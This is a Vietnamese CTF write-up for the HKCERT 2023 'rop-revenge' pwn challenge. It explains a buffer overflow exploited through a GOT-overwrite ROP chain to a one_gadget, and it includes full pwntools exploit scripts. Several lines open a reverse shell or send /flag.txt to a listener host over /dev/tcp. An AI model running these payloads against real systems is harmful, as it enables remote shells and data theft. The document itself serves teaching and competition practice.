---
title: Rop-Revenge
date: 2025-02-10 00:00:00 +0800
categories: [pwn]
tags: [technical,rop]
author: "kuvee"
layout: post
---

- đây là 1 bài sử dụng gadget khá hay mà mình tìm được nên hôm nay mình sẽ viết lại writeup bài này 

file [here](/assets/files/rop-revenge_HKCERT-2023.rar)

## analys

- có rất nhiều kĩ thuật rop đã được ra đời cho đến bây giờ như **ret2shellcode** , **ret2plt** , **ret2csu** , **ret2syscall** ... , nhưng ở bài này author đã thêm 1 số hạn chế vào , ta sẽ cùng xem nó :

```c
int vuln()
{
  _BYTE v1[112]; // [rsp+0h] [rbp-70h] BYREF

  gets(v1);
  close(1);
  return close(2);
}
```

- nhìn qua thì ta thấy 1 lỗi **bof** cơ bản , tuy nhiên điều khó khăn ở đây là ta sẽ không có bất kì hàm win nào , và cũng không có hàm **puts** hoặc **printf** nào để leak libc và hơn nữa là trước khi end ctrinh thì nó cũng đóng **Stdout** và **stderr** 

![here](/assets/images/rop.png)

1 mẹo nhỏ để tắt cảnh báo của alarm : **handle SIGALRM nopass** trong gdb

## EXPLOIT

- đầu tiên ta sẽ nghĩ đến cách mở lại **stdout** vì nếu nó bị đóng thì ta lấy shell cũng không được , [here](https://blog.idiot.sg/2018-09-03/tokyowesterns-ctf-2018-load-pwn/) có 1 cách để lấy là sử dụng **open** để lấy lại **stdout** tuy nhiên ở bài này không có hàm **open** hoặc bất kì gadget **syscall** nào  và ta sẽ tham khảo cách reverse_shell ở bài này [here](https://atum.li/2017/11/08/babyfs/#get-a-shell)

```bash
bash -c 'bash -i >& /dev/tcp/myipaddress/8888 0>&1
```

- tiếp theo ta sẽ tìm 1 cách để lấy shell , ở bài này ta không thể leak libc , mặc dù có thể control được rdi , rsi , rdx , tuy nhiên ta lại không có syscall để thực thi execve('/bin/sh', 0, 0)

- lúc này ta có thể đọc 1 bài viết trên reddit [redit](https://www.reddit.com/r/securityCTF/comments/n3x0ha/is_there_a_way_to_leak_addresses_without_output/) , nó đề cập đến việc lấy shell với điều kiện là không thể leak bất cứ thứ gì , điều kiện của kĩ thuật này là :
  - got có thể ghi 
- nếu 1 địa chỉ của **one_gadget** đủ gần với các địa chỉ got@libc , ta có thể ghi đè 2 bytes và lúc này tỉ lệ thành công là 2^4 (1/16)  
- 1 người khác cũng đề cập rằng anh ấy đã tìm kiếm được 1 gadget hữu ích **add [r14+0x90], r15**  , ta sẽ đặt **r14** thành địa chỉ exe@got-0x90 và **r15** sẽ là độ lệch giữa gots@libc với one_gadget 

- ở đây mình không biết tại sao **ropper** lại không tìm thấy điều này , thay vào đó ta sử dụng **ROPgadget** , nó ở **0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret** , ta có thể control được cả rbp và rbx trong trường hợp này 

```cs
ploi@PhuocLoiiiii:~/pwn/rop-revenge_HKCERT-2023/chall/src$ ROPgadget --binary chall_patched
Gadgets information
============================================================
0x00000000004010dd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040110b : add bh, bh ; loopne 0x401175 ; nop ; ret
0x00000000004012cc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401256 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040117a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012ce : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401258 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000040110a : add dil, dil ; loopne 0x401175 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401177 : add eax, 0x2f0b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000401201 : call qword ptr [rax + 0xff3c35d]
0x0000000000401235 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x0000000000401193 : cli ; jmp 0x401120
0x00000000004010e3 : cli ; ret
0x00000000004012db : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401190 : endbr64 ; jmp 0x401120
0x00000000004010e0 : endbr64 ; ret
0x00000000004012ac : fisttp word ptr [rax - 0x7d] ; ret
0x00000000004010de : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401105 : je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401147 : je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401194 : jmp 0x401120
0x000000000040100b : jmp 0x4840103f
0x000000000040110c : jmp rax
0x0000000000401237 : leave ; ret
0x000000000040110d : loopne 0x401175 ; nop ; ret
0x0000000000401176 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret
0x0000000000401255 : mov eax, 0 ; pop rbp ; ret
0x0000000000401107 : mov edi, 0x404048 ; jmp rax
0x00000000004010df : nop ; endbr64 ; ret
0x0000000000401236 : nop ; leave ; ret
0x0000000000401202 : nop ; pop rbp ; ret
0x000000000040110f : nop ; ret
0x000000000040118c : nop dword ptr [rax] ; endbr64 ; jmp 0x401120
0x0000000000401106 : or dword ptr [rdi + 0x404048], edi ; jmp rax
0x0000000000401178 : or ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004012bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012be : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012c0 : pop r14 ; pop r15 ; ret
0x00000000004012c2 : pop r15 ; ret
0x00000000004012bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004012bf : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040117d : pop rbp ; ret
0x00000000004012c3 : pop rdi ; ret
0x00000000004012c1 : pop rsi ; pop r15 ; ret
0x00000000004012bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040101a : ret
0x00000000004011a1 : retf
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x00000000004012dd : sub esp, 8 ; add rsp, 8 ; ret
0x00000000004012dc : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401103 : test eax, eax ; je 0x401110 ; mov edi, 0x404048 ; jmp rax
0x0000000000401145 : test eax, eax ; je 0x401150 ; mov edi, 0x404048 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 67
```

- onegadget : 

```cs
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

- libc_csu_init : 

```cs
<__libc_csu_init>:
0x00000000004012a0 <+64>:    mov    rdx,r14
0x00000000004012a3 <+67>:    mov    rsi,r13
0x00000000004012a6 <+70>:    mov    edi,r12d
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x00000000004012ad <+77>:    add    rbx,0x1
0x00000000004012b1 <+81>:    cmp    rbp,rbx
0x00000000004012b4 <+84>:    jne    0x4012a0 <__libc_csu_init+64>
0x00000000004012b6 <+86>:    add    rsp,0x8
0x00000000004012ba <+90>:    pop    rbx
0x00000000004012bb <+91>:    pop    rbp
0x00000000004012bc <+92>:    pop    r12
0x00000000004012be <+94>:    pop    r13
0x00000000004012c0 <+96>:    pop    r14
0x00000000004012c2 <+98>:    pop    r15
0x00000000004012c4 <+100>:   ret
........................
........................
```

- ở đây ta cần setup one_gadget để nó có thể thực thi , ta sẽ chọn og này : 

ta sẽ setup cho **r13** và **r14** thành NULL và nó sẽ được mov vào **rsi** và **rdx**

```cs
0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

-  và ta cũng sẽ cần lệnh call đến got mà ta đã setup , ta sẽ đặt **rbx** thành 0 cho dễ tính toán 

```cs
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
```

- ta sẽ setup change libc@got -> one_gadget như sau : 

```cs 
og = 0xebd38

gadget = 0x40117C #  add dword ptr [rbp - 0x3d], ebx ; nop ; ret

rbx = (og - libc.sym.alarm)
"""
0x00000000004012a0 <+64>:    mov    rdx,r14
0x00000000004012a3 <+67>:    mov    rsi,r13
0x00000000004012a6 <+70>:    mov    edi,r12d
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x00000000004012ad <+77>:    add    rbx,0x1
0x00000000004012b1 <+81>:    cmp    rbp,rbx
0x00000000004012b4 <+84>:    jne    0x4012a0 <__libc_csu_init+64>
0x00000000004012b6 <+86>:    add    rsp,0x8
0x00000000004012ba <+90>:    pop    rbx
0x00000000004012bb <+91>:    pop    rbp
0x00000000004012bc <+92>:    pop    r12
0x00000000004012be <+94>:    pop    r13
0x00000000004012c0 <+96>:    pop    r14
0x00000000004012c2 <+98>:    pop    r15
0x00000000004012c4 <+100>:   ret
"""
rop_chain_pop = 0x00000000004012ba
rop_chain_mov = 0x00000000004012a0

payload = b'a'*120
# control rbp and rbx to add got -> execve
payload += p64(rop_chain_pop) + p64(rbx) + p64(exe.got.alarm+0x3d) + p64(0)*4 + p64(gadget) + p64(exe.sym.vuln)
```

- ta thấy lúc này libc@got của alarm đã thay đổi thành one_gadget 

![hehe](/assets/images/og.png)

- bây giờ cuối cùng ta sẽ setup cho **og** và call đến alarm@got , chú ý là cần thêm **address rbp-0x48 is writable** nên ta setup nó là **bss**

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
#gdb.attach(p,gdbscript='''
 #          b*0000000000401238
 #          ''')

og = 0xebd38

gadget = 0x40117C #  add dword ptr [rbp - 0x3d], ebx ; nop ; ret

rbx = (og - libc.sym.alarm)
"""
0x00000000004012a0 <+64>:    mov    rdx,r14
0x00000000004012a3 <+67>:    mov    rsi,r13
0x00000000004012a6 <+70>:    mov    edi,r12d
0x00000000004012a9 <+73>:    call   QWORD PTR [r15+rbx*8]
0x00000000004012ad <+77>:    add    rbx,0x1
0x00000000004012b1 <+81>:    cmp    rbp,rbx
0x00000000004012b4 <+84>:    jne    0x4012a0 <__libc_csu_init+64>
0x00000000004012b6 <+86>:    add    rsp,0x8
0x00000000004012ba <+90>:    pop    rbx
0x00000000004012bb <+91>:    pop    rbp
0x00000000004012bc <+92>:    pop    r12
0x00000000004012be <+94>:    pop    r13
0x00000000004012c0 <+96>:    pop    r14
0x00000000004012c2 <+98>:    pop    r15
0x00000000004012c4 <+100>:   ret
"""
rop_chain_pop = 0x00000000004012ba
rop_chain_mov = 0x00000000004012a0

payload = b'a'*120
# control rbp and rbx to add got -> execve
payload += p64(rop_chain_pop) + p64(rbx) + p64(exe.got.alarm+0x3d) + p64(0)*4 + p64(gadget) + p64(exe.sym.vuln)

p.sendline(payload)


payload2 =  b'a'*120 + p64(rop_chain_pop) + p64(0) + p64(0x405000-0x200) + p64(0)*3 + p64(exe.got.alarm) + p64(rop_chain_mov)

input()
p.sendline(payload2)
# after getting shell on remote server run the following
# bash -c 'sh -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'
p.interactive()
```

![og](/assets/images/one_gg.png)



- khai thác dự định : 

```python
from pwn import *

context.binary = elf = ELF('./chall')

# host a server listen to the flag
listener_ip = ''
listener_port = 4444

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=[f"bash -c 'cat /flag.txt >& /dev/tcp/{listener_ip}/{listener_port}'"])
rop.raw(rop.ret)
rop.gets(dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

p = remote('chal.hkcert23.pwnable.hk', 28333)

p.sendline(fit({120: raw_rop}))
sleep(1)
p.sendline(dlresolve.payload)

p.interactive()

```

![here](/assets/images/flag1.png)